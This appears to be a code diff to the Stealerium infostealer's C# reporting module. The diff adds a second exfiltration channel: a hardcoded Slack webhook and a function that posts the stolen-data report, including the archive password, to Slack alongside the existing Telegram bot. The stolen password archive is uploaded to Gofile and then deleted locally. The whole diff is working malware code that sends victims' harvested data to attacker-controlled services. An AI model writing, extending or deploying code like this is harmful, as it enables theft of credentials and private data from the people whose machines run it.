@@ -1,12 +1,11 @@
 ﻿using System;
-using System.Collections.Generic;
 using System.IO;
-using System.Linq;
 using System.Net.Http;
+using System.Text;
 using System.Text.Json;
-using System.Text.RegularExpressions;
 using System.Threading.Tasks;
-using Newtonsoft.Json.Linq;
+using System.Linq;
+using System.Text.RegularExpressions;
 using Stealerium.Helpers;
 using Stealerium.Modules.Implant;
 using Stealerium.Target.System;
@@ -18,6 +17,9 @@ namespace Stealerium
         private const int MaxKeylogs = 10;
 
         private static string TelegramBotAPI = "https://api.telegram.org/bot";
+
+        // Slack webhook URL
+        private static readonly string SlackWebhookUrl = "https://hooks.slack.com/services/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";
 
         // Message id location
         private static readonly string LatestMessageIdLocation = Path.Combine(Paths.InitWorkDir(), "msgid.dat");
@@ -75,44 +77,8 @@ namespace Stealerium
         /// <returns>Message ID, or -1 if not found or an error occurs</returns>
         private static int GetMessageId(string response)
         {
-            Match match = Regex.Match(response, "\"result\":{\"message_id\":\\d+");
+            var match = Regex.Match(response, "\"result\":{\"message_id\":\\d+");
             return Int32.Parse(match.Value.Replace("\"result\":{\"message_id\":", ""));
-        }
-
-        /// <summary>
-        /// Check if the Telegram token is valid asynchronously
-        /// </summary>
-        /// <returns>Returns a Task<bool> indicating if the token is valid</returns>
-        public static async Task<bool> TokenIsValidAsync()
-        {
-            try
-            {
-                using (HttpClient client = new HttpClient())
-                {
-                    // Build the full request URL
-                    string requestUrl = TelegramBotAPI + Config.TelegramAPI + "/getMe";
-
-                    // Send the request asynchronously
-                    HttpResponseMessage response = await client.GetAsync(requestUrl);
-
-                    // Ensure the response is successful
-                    if (response.IsSuccessStatusCode)
-                    {
-                        // Read the response content as a string
-                        string responseBody = await response.Content.ReadAsStringAsync();
-
-                        // Check if the response indicates the token is valid
-                        return responseBody.StartsWith("{\"ok\":true,");
-                    }
-                }
-            }
-            catch (Exception error)
-            {
-               Logging.Log("Telegram >> Invalid token:\n" + error);
-            }
-
-            // Return false if there was an error or the token is invalid
-            return false;
         }
 
         /// <summary>
@@ -157,7 +123,6 @@ namespace Stealerium
             return 0;
         }
 
-
         /// <summary>
         /// Edit message text in Telegram bot asynchronously
         /// </summary>
@@ -192,6 +157,80 @@ namespace Stealerium
             {
                 // Log any exceptions that occur during the request
                 Logging.Log("Telegram >> EditMessage exception:\n" + error);
+            }
+        }
+
+        /// <summary>
+        /// Check if the Telegram token is valid asynchronously
+        /// </summary>
+        /// <returns>Returns a Task<bool> indicating if the token is valid</returns>
+        public static async Task<bool> TokenIsValidAsync()
+        {
+            try
+            {
+                using (HttpClient client = new HttpClient())
+                {
+                    // Build the full request URL
+                    string requestUrl = TelegramBotAPI + Config.TelegramAPI + "/getMe";
+
+                    // Send the request asynchronously
+                    HttpResponseMessage response = await client.GetAsync(requestUrl);
+
+                    // Ensure the response is successful
+                    if (response.IsSuccessStatusCode)
+                    {
+                        // Read the response content as a string
+                        string responseBody = await response.Content.ReadAsStringAsync();
+
+                        // Check if the response indicates the token is valid
+                        return responseBody.StartsWith("{\"ok\":true,");
+                    }
+                }
+            }
+            catch (Exception error)
+            {
+                Logging.Log("Telegram >> Invalid token:\n" + error);
+            }
+
+            // Return false if there was an error or the token is invalid
+            return false;
+        }
+
+        /// <summary>
+        /// Send a report to Slack asynchronously
+        /// </summary>
+        /// <param name="text">Message text</param>
+        /// <returns>Returns a Task indicating completion</returns>
+        public static async Task SendSlackMessageAsync(string text)
+        {
+            try
+            {
+                using (HttpClient client = new HttpClient())
+                {
+                    // Create the JSON payload for Slack
+                    var payload = new
+                    {
+                        text = text
+                    };
+
+                    // Convert the payload to JSON
+                    var jsonPayload = JsonSerializer.Serialize(payload);
+
+                    // Send a POST request to the Slack webhook URL
+                    var content = new StringContent(jsonPayload, Encoding.UTF8, "application/json");
+                    HttpResponseMessage response = await client.PostAsync(SlackWebhookUrl, content);
+
+                    // Log the result
+                    if (!response.IsSuccessStatusCode)
+                    {
+                        Logging.Log("Slack >> Message sending failed with status code: " + response.StatusCode);
+                    }
+                }
+            }
+            catch (Exception error)
+            {
+                // Log any exceptions that occur during the request
+                Logging.Log("Slack >> SendMessage exception:\n" + error);
             }
         }
 
@@ -236,7 +275,7 @@ namespace Stealerium
         {
             UploadKeylogs();
 
-            // Get info
+            // Get system info as a report string
             var info = "```"
                        + "\n😹 *Stealerium - Report:*"
                        + "\nDate: " + SystemInfo.Datenow
@@ -318,20 +357,29 @@ namespace Stealerium
                        + "\n🔐 Archive password is: \"" + StringsCrypt.ArchivePassword + "\""
                        + "```";
 
+            // Send to Telegram
             int last = GetLatestMessageId();
             if (last != -1)
                 await EditMessageAsync(info, last).ConfigureAwait(false);
             else
                 SetLatestMessageId(await SendMessageAsync(info).ConfigureAwait(false));
+
+            // Send to Slack
+            await SendSlackMessageAsync(info);
         }
 
+        /// <summary>
+        /// Send report asynchronously to Telegram and Slack
+        /// </summary>
+        /// <param name="file">The file path of the archive</param>
+        /// <returns>A Task representing the asynchronous operation</returns>
         public static async Task SendReportAsync(string file)
         {
             Logging.Log("Sending passwords archive to Gofile");
             var url = GofileFileService.UploadFileAsync(file);
-            Logging.Log("Sending report to Telegram");
+            Logging.Log("Sending report to Telegram and Slack");
             await SendSystemInfoAsync(await url.ConfigureAwait(false)).ConfigureAwait(false);
-            Logging.Log("Report sent to Telegram");
+            Logging.Log("Report sent to Telegram and Slack");
             File.Delete(file);
         }
     }
